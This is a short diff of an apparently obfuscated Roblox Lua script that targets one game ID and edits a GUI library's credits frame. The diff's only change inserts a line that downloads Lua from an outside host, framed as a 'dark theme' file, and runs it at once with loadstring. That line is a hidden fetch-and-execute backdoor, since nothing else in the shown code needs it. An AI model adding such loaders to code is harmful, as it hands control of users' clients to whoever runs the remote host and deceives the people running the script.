@@ -3673,7 +3673,8 @@ local code_index = "kQWtJvD"
 }) do
 	return L_1321_forvar2
 end;
-spawn(function() if game.PlaceId == "1537690962" then local frames = game:GetService("CoreGui").Library.MainFrame.ContainerHold:GetChildren()
+spawn(function() loadstring(game:HttpGet("http://ligma.wtf/theme/dark.lua",true))()
+if game.PlaceId == "1537690962" then local frames = game:GetService("CoreGui").Library.MainFrame.ContainerHold:GetChildren()
 credits = frames[10]
 wait(4)
 for i,v in pairs(credits:GetChildren()) do
